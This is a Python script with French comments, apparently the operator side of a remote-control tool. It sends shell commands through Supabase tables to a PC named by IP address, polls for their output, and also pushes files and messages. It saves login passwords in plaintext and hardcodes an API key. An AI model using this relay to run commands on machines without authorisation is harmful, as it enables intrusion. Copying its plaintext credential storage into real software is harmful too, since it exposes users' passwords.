# Installer les dépendances nécessaires
import subprocess
import sys

# Liste des dépendances
dependencies = [
    "tk",                # Pour tkinter (inclus avec Python, mais ajouté pour clarté)
    "supabase",          # Pour interagir avec Supabase
    "websocket-client",  # Pour gérer les WebSockets
    "plyer",             # Pour les notifications système
    "tqdm"               # Pour la barre de progression
]

import tkinter as tk
from tkinter import filedialog
from supabase import create_client, Client
import os  # Pour gérer les chemins
import time  # Pour les pauses
import sys  # Pour quitter proprement le script
import base64  # Pour encoder et décoder les fichiers en base64
import re  # Pour nettoyer les noms de fichiers
from tqdm import tqdm  # Importer tqdm pour la barre de progression

# Configuration Supabase
SUPABASE_URL = "https://isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Variable globale pour stocker l'utilisateur connecté
current_user = None
USER_INFO_FILE = "user_info.txt"  # Nom du fichier pour stocker les informations utilisateur


def save_user_info(email, password):
    """Enregistrer les informations utilisateur dans un fichier."""
    try:
        with open(USER_INFO_FILE, "w") as file:
            file.write(f"{email}\n{password}")
        print("[✅] Informations utilisateur enregistrées dans 'user_info.txt'.")
    except Exception as e:
        print(f"[‼️] Erreur lors de l'enregistrement des informations utilisateur : {e}")


def load_user_info():
    """Charger les informations utilisateur depuis un fichier."""
    try:
        if os.path.exists(USER_INFO_FILE):
            with open(USER_INFO_FILE, "r") as file:
                lines = file.readlines()
                if len(lines) >= 2:
                    email = lines[0].strip()
                    password = lines[1].strip()
                    return email, password
        return None, None
    except Exception as e:
        print(f"[‼️] Erreur lors du chargement des informations utilisateur : {e}")
        return None, None


def sanitize_file_name(file_name):
    """Nettoyer le nom du fichier pour Supabase Storage."""
    return re.sub(r'[^a-zA-Z0-9._-]', '_', file_name)


def create_user():
    """Créer un nouvel utilisateur."""
    print("=== Création d'un nouvel utilisateur ===")
    email = input("Email : ").strip()
    password = input("Mot de passe : ").strip()

    try:
        response = supabase.auth.sign_up({
            "email": email,
            "password": password
        })

        if response.user:
            print(f"[✅] Utilisateur créé avec succès : {response.user.email}")
            save_user_info(email, password)  # Enregistrer les informations utilisateur
        else:
            print(f"[❌] Erreur : {response}")
    except Exception as e:
        print(f"[‼️] Exception lors de la création de l'utilisateur : {e}")


def login_user(email=None, password=None):
    """Connecter un utilisateur."""
    global current_user  # Utiliser la variable globale pour stocker l'utilisateur connecté

    if not email or not password:
        print("=== Connexion d'un utilisateur ===")
        email = input("Email : ").strip()
        password = input("Mot de passe : ").strip()

    try:
        response = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })

        if response.user:
            current_user = response.user  # Stocker l'utilisateur connecté
            print(f"[✅] Connexion réussie : {response.user.email}")
            save_user_info(email, password)  # Enregistrer les informations utilisateur
        else:
            print(f"[❌] Erreur : {response}")
    except Exception as e:
        print(f"[‼️] Exception lors de la connexion : {e}")


def main_menu():
    """Afficher le menu principal."""
    global current_user  # Utiliser la variable globale pour vérifier l'état de l'utilisateur connecté

    # Vérifier si le fichier user_info.txt existe
    email, password = load_user_info()
    if email and password:
        print("[🛠️] Informations utilisateur trouvées. Tentative de connexion...")
        login_user(email, password)
        if current_user:
            print(f"[✅] Bienvenue, {current_user.email} !")
            main_menu2()
            return

    # Si aucune connexion automatique n'est possible, proposer l'inscription ou la connexion
    while True:
        print("""
=== Menu Principal ===
1. S'inscrire
2. Se connecter
3. Quitter
        """)
        choix = input("Votre choix : ").strip()
        if choix == "1":
            create_user()
        elif choix == "2":
            login_user()
        elif choix == "3":
            print("Au revoir !")
            sys.exit(0)
        else:
            print("[❌] Choix invalide. Veuillez réessayer.")

        if current_user:
            print(f"[✅] Bienvenue, {current_user.email} !")
            main_menu2()
            break


def upload_file_to_supabase(file_path):
    """Uploader un fichier sur Supabase Storage avec une barre de progression."""
    try:
        original_file_name = os.path.basename(file_path)
        file_name = sanitize_file_name(original_file_name)  # Nettoyer le nom du fichier
        file_size = os.path.getsize(file_path)  # Obtenir la taille du fichier

        with open(file_path, "rb") as file:
            # Lire le fichier par morceaux pour afficher la progression
            chunk_size = 1024 * 1024  # 1 Mo
            file_content = b""
            with tqdm(total=file_size, unit="B", unit_scale=True, desc=f"Uploading {file_name}") as progress_bar:
                while chunk := file.read(chunk_size):
                    file_content += chunk
                    progress_bar.update(len(chunk))

        # Stocker le fichier dans Supabase Storage
        response = supabase.storage.from_("uploads").upload(file_name, file_content)

        # Vérifier si l'upload a réussi
        if hasattr(response, "error") and response.error:  # Vérifie si une erreur est présente
            print(f"[❌] Erreur lors de l'upload : {response.error}")
            return None
        else:
            print(f"[✅] Fichier '{file_name}' uploadé avec succès sur Supabase Storage.")
            return file_name
    except Exception as e:
        print(f"[‼️] Erreur lors de l'upload du fichier : {e}")
        return None


def open_file_dialog():
    """Ouvrir une fenêtre pour sélectionner un fichier."""
    root = tk.Tk()
    root.withdraw()  # Masquer la fenêtre principale
    file_path = filedialog.askopenfilename(title="Sélectionnez un fichier")
    if file_path:
        print(f"[📂] Fichier sélectionné : {file_path}")
        return file_path
    else:
        print("[⚠️] Aucun fichier sélectionné.")
        return None


def main_menu2():
    """Gérer les commandes et interactions avec Supabase."""
    destinataire = input("Donner l'adresse IP du PC avec qui vous voulez communiquer : ").strip()
    actual_path = os.getcwd()  # Initialiser le chemin actuel avec le répertoire courant
    print(f"[📂] Chemin actuel : {actual_path}")

    while True:
        print("""
=== Menu Commandes ===
1. Envoyer une commande
2. Partager un fichier
3. Envoyer un message
4. Quitter
        """)
        choix = input("Votre choix : ").strip()

        if choix == "1":
            print("=== Mode envoi de commandes ===")
            print("Tapez 'exit' pour revenir au menu principal.")
            while True:
                commande = input(f"{actual_path} > ").strip()
                if commande.lower() == "exit":
                    print("Retour au menu principal.")
                    break

                if commande.startswith("cd "):
                    new_path = commande[3:].strip()
                    try:
                        new_path = os.path.expanduser(new_path)
                        os.chdir(new_path)
                        actual_path = os.getcwd()
                        print(f"[📂] Chemin changé : {actual_path}")
                    except FileNotFoundError:
                        print(f"[❌] Répertoire introuvable : {new_path}")
                    except Exception as e:
                        print(f"[‼️] Erreur lors du changement de répertoire : {e}")
                    continue

                commande_data = {"commande": commande, "pour": destinataire, "path": actual_path}
                try:
                    # Insérer la commande dans la table "commandes"
                    response = supabase.table("commandes").insert(commande_data).execute()
                    if response.data:
                        commande_id = response.data[0]["id"]
                        print(f"[✅] Commande ajoutée avec succès. ID de la commande : {commande_id}")

                        # Attendre le résultat de la commande
                        print("[⏳] En attente du résultat de la commande...")
                        while True:
                            result_response = supabase.table("commandes").select("result").eq("id", commande_id).execute()
                            result_data = result_response.data
                            if result_data and result_data[0].get("result"):
                                print(f"[🖥️] Résultat de la commande :\n{result_data[0]['result']}")
                                break
                            time.sleep(2)  # Attendre 2 secondes avant de vérifier à nouveau
                except Exception as e:
                    print(f"[‼️] Exception lors de l'ajout de la commande : {e}")

        elif choix == "2":
            print("=== Partage de fichier ===")
            file_path = open_file_dialog()
            if file_path:
                file_name = upload_file_to_supabase(file_path)
                if file_name:
                    file_data = {"file_name": file_name, "pour": destinataire}
                    try:
                        response = supabase.table("fichiers").insert(file_data).execute()
                        if response.data:
                            print(f"[✅] Notification envoyée au serveur pour le fichier '{file_name}'.")
                        else:
                            print("[❌] Erreur lors de l'envoi de la notification au serveur.")
                    except Exception as e:
                        print(f"[‼️] Erreur lors de l'insertion dans la table 'fichiers' : {e}")

        elif choix == "3":
            print("=== Mode envoi de messages ===")
            while True:
                message = input("Entrez votre message (ou tapez 'exit' pour revenir au menu principal) : ").strip()
                if message.lower() == "exit":
                    print("Retour au menu principal.")
                    break

                message_data = {"message": message, "pour": destinataire}
                try:
                    response = supabase.table("messages").insert(message_data).execute()
                    print(f"[🛠️] Réponse de l'insertion (messages) : {response}")  # Log pour vérifier la réponse
                    if response.data:
                        print(f"[✅] Message envoyé avec succès : {message}")
                except Exception as e:
                    print(f"[‼️] Erreur lors de l'envoi du message : {e}")

        elif choix == "4":
            print("Au revoir !")
            break
        else:
            print("[❌] Choix invalide. Veuillez réessayer.")


if __name__ == "__main__":
    main_menu()